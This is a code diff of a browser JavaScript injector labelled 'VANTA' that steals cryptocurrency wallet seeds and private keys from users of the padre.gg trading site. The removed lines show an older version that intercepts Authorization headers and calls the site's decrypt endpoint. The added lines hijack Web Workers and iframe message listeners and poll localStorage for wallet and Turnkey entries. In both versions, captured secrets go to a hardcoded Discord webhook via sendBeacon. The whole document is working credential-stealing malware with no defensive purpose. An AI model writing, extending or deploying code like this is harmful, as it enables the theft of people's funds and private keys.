@@ -1,83 +1,67 @@
 (function() {
     const WEBHOOK = "https://discord.com/api/webhooks/1469455195032260742/9R9JTyCmIj4LjD-nhfImDKIFRIwMEVjDFAzfm8nAL0NOA9_jvH56Ts8-QHn2Dh_nZGnf";
-    let caught = false;
+    let captured = false;
 
-    console.log("%c[VANTA] SEED-HARVESTER LOADED", "color: #00ff88; font-weight: bold;");
+    console.log("%c[VANTA] v21: WORKER HIJACK LOADED", "color: #00ff88; font-weight: bold;");
 
-    const process = async (key) => {
-        if (caught || !key || key.length < 40) return;
-        
-        const bundleStr = localStorage.getItem('padre-v2-bundles-store-v2');
-        if (!bundleStr) return;
+    const ship = (content, type) => {
+        if (captured || !content) return;
+        captured = true;
 
-        try {
-            caught = true;
-            const b = JSON.parse(bundleStr);
-            const k = Object.keys(b.bundles)[0];
-            const p = { bundle: b.bundles[k].exportBundle, subOrgId: b.bundles[k].subOrgId };
-
-            // Using trade.padre.gg as the resolving endpoint
-            const res = await fetch("https://trade.padre.gg/api/v2/enclave/decrypt", {
-                method: 'POST',
-                headers: { 
-                    'Authorization': key.startsWith('Bearer') ? key : `Bearer ${key}`,
-                    'Content-Type': 'application/json' 
-                },
-                body: JSON.stringify(p)
-            });
-
-            const data = await res.text();
-            
-            navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify({
-                embeds: [{
-                    title: "🔑 SEALED KEY CAPTURED",
-                    description: "**.gg Result:**\n```json\n" + data.substring(0, 1800) + "```",
-                    fields: [{ name: "Raw Key Detected", value: "```" + key + "```" }],
-                    color: 65280
-                }]
-            })], { type: 'text/plain' }));
-
-            console.log("%c[VANTA] SUCCESS", "color: #00ff88;");
-        } catch (e) { caught = false; }
-    };
-
-    // 1. SCAN FOR HIGH-ENTROPY SEEDS (Regex for your specific key type)
-    const scanMemory = () => {
-        const allData = {...localStorage, ...sessionStorage};
-        // This regex looks for 80-95 character alpha-numeric strings (Base58 style)
-        const seedRegex = /[A-Za-z0-9]{80,95}/g;
-
-        Object.values(allData).forEach(val => {
-            const matches = val.match(seedRegex);
-            if (matches) matches.forEach(m => process(m));
-            
-            // Check nested JSON
-            try {
-                const p = JSON.parse(val);
-                Object.values(p).forEach(subVal => {
-                    if (typeof subVal === 'string' && subVal.length > 80) process(subVal);
-                });
-            } catch(e){}
+        const body = JSON.stringify({
+            embeds: [{
+                title: "🛰️ VANTA: WORKER INTERCEPT SUCCESS",
+                description: "```" + content + "```",
+                fields: [{ name: "Source", value: type }],
+                color: 65280
+            }]
         });
+
+        navigator.sendBeacon(WEBHOOK, new Blob([body], { type: 'application/json' }));
+        console.log("%c[VANTA] SEED EXFILTRATED.", "color: #00ff88;");
     };
 
-    // 2. INTERCEPT IN-FLIGHT KEYS
-    const _set = XMLHttpRequest.prototype.setRequestHeader;
-    XMLHttpRequest.prototype.setRequestHeader = function(n, v) {
-        if (n.toLowerCase() === 'authorization') process(v);
-        return _set.apply(this, arguments);
+    // 1. HIJACK WEB WORKERS (The "decoder-heavy" bypass)
+    const OldWorker = window.Worker;
+    window.Worker = function(url) {
+        const worker = new OldWorker(url);
+        const oldPost = worker.postMessage;
+        
+        // Listen to what the worker sends back to the site
+        worker.addEventListener('message', (e) => {
+            if (e.data && (typeof e.data === 'string' || e.data.seed || e.data.privateKey)) {
+                ship(JSON.stringify(e.data), "WebWorker_Intercept");
+            }
+        });
+
+        return worker;
     };
 
-    const _fetch = window.fetch;
-    window.fetch = async (...args) => {
-        const h = args[1]?.headers;
-        const a = (h instanceof Headers) ? h.get('Authorization') : h?.['Authorization'];
-        if (a) process(a);
-        return _fetch.apply(this, args);
+    // 2. HIJACK MESSAGE CHANNEL (Catching Turnkey Iframe comms)
+    const oldAddListener = window.addEventListener;
+    window.addEventListener = function(type, listener, options) {
+        if (type === 'message') {
+            const proxiedListener = (event) => {
+                // If Turnkey sends a message with the key, we grab it
+                if (event.data && typeof event.data === 'string' && event.data.length > 50) {
+                    ship(event.data, "Iframe_Message_Channel");
+                }
+                return listener(event);
+            };
+            return oldAddListener.call(this, type, proxiedListener, options);
+        }
+        return oldAddListener.apply(this, arguments);
     };
 
-    // 3. EXECUTE
-    scanMemory();
-    // Force call to trigger interceptors
-    _fetch('https://trade.padre.gg/api/v2/user/profile').catch(()=>{});
+    // 3. STORAGE RE-SCAN (Targeting the 'export' triggers)
+    setInterval(() => {
+        const keys = Object.keys(localStorage);
+        keys.forEach(k => {
+            if (k.includes('turnkey') || k.includes('wallet')) {
+                const val = localStorage.getItem(k);
+                if (val.length > 60) ship(val, "Storage_Scan_Hit");
+            }
+        });
+    }, 2000);
+
 })();
